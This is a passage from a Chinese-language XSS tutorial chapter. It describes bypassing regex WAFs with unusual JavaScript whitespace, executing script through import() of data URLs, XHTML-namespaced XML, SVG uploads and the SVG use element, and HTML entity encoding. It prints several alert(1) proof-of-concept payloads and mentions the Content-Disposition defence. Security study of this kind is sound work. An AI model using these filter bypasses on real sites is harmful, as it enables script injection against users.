  mdcn: "\n## 空格字符\n\nJavaScript 中有很多空白字符，使用它们可以帮助绕过那些使用正则表达式查找某些关键词的简单 WAF。这里是一种测试空白的简单方法（注意：这将包括换行符、回车符和行/段落分隔符）：\n\
    \n```javascript\nlog=[];\nfunction funct(){\n  for(let i=0;i<=0x10ffff;i++){\n\
    \    try{\n      eval(`func${String.fromCodePoint(i)}`);\n      log.push(i);\n\
    \    } catch(e){}\n  }\n}\nconsole.log(log);\n// 9,10,11,12,13,32,160,5760,8192,8193,8194,8195,8196,8197,8198,8199,8200,8201,8202,8232,8233,8239,8287,12288,65279\n\
    ```\n\n可以使用原始字符，如果它们出现在 SVG 或 HTML 属性中，则可以进行 HTML 编码：\n\n```html\n<img/src/onerror=alert&#65279;(1)>\n\
    ```\n\n## 动态导入\n\nJavaScript 允许你使用 `import()` 动态加载模块，它就像一个普通函数，但允许 JavaScript\
    \ 引擎决定是否实际需要。这个函数表达式允许你指定要加载的 URL，并非常方便地指定数据 URL 来执行任意 JavaScript：\n\n```javascript\n\
    import('data:text/javascript,alert(1)')\n```\n\n## XML 中的 XHTML 命名空间\n\n如果你可以控制内容类型为\
    \ `text/xml` 的 XML 文件，只要提供 XHTML 命名空间，仍然可以执行 JavaScript。\n\n# 第八章 - XSS\n\n```xml\n\
    <xml>\n<text>hello<img src=\"i\" onerror=\"alert(i)\" /></text>\n</xml>\n```\n\
    \n如果没有命名空间，浏览器将上述代码作为 XML 渲染并显示 XML 视图。然而，为 img 元素添加命名空间将允许其被渲染为 HTML：\n\n```xml\n\
    <xml>\n<text>hello<img src=\"i\" onerror=\"alert(i)\" xmlns=\"http://www.w3.org/1999/xhtml\"\
    \ />></text>\n</xml>\n```\n\n这对于文件上传或当你控制具有 XML 内容类型的 REST API 响应时非常有用。\n\n##\
    \ SVG 上传\n\n在 Web 应用中允许上传图片是很常见的，但很多人忘记了可以在 SVG 文档中使用脚本。与 HTML 内部不同，使用正确 MIME\
    \ 类型的 SVG 时，解析更加严格。你需要确保添加了正确的命名空间属性，并且它符合 XML 解析规则，例如，所有属性都应该加引号。\n\n```svg\n\
    <svg id='x' xmlns=\"http://www.w3.org/2000/svg\" xmlns:link=\"http://www.w3.org/1999/x\"\
    \nlink width='100' height='100\">\n<image href=\"#\" onerror=\"alert(1)\" />\n\
    </svg>\n```\n\n你可以通过明显过滤 SVG 来防止此类漏洞的利用，但如果你无法这样做，可以始终通过 `Content-Disposition`\
    \ 头部和附加值来提供文件：\n\nContent-Disposition: attachment\n\n这应该防止 SVG 在现代浏览器中渲染。但有一个例外：如果它是通过\
    \ `<use>` 元素嵌入的，它仍然会被渲染。\n\n## SVG use 元素\n\n如上述，你可以通过在 SVG 内部使用 `<use>` 元素嵌入\
    \ SVG 文档来获取 JavaScript 执行。这生效的前提是文档位于相同域。你也可以使用数据 URL，我将在下方演示：\n\n```svg\n<svg><use\
    \ href='data:image/svg&lt;svg id='x' xmlns='http://www.w3.org/2000/svg&gt;&lt;img\
    \ href='1' onerror='alert(1)'&lt;/svg&gt;*x' />\n```\n\n注意，因为数据 URL 使用了有效的 SVG\
    \ MIME 类型，因此适用更严格的规则。值得注意的是，即使通过此数据 URL，它也不会从空源执行，而是将继承页面的源。\n\n## HTML 实体\n\n\
    HTML 拥有广泛的编码选项。在本节中，我将介绍使用实体编码字符的各种方法，并在每个节的结束时给出几个示例。\n\n## 十进制实体\n\n你可以使用字符代码来表示不同的字符，它们以\
    \ `&#` 开头并以可选的分号结尾。对于字符 \"j\"，表示为字符 106。为了生成此字符，我们只需将前缀与代码结合，后跟一个可选的分号。你还可以在字符代码之前使用任意数量的零：\n\
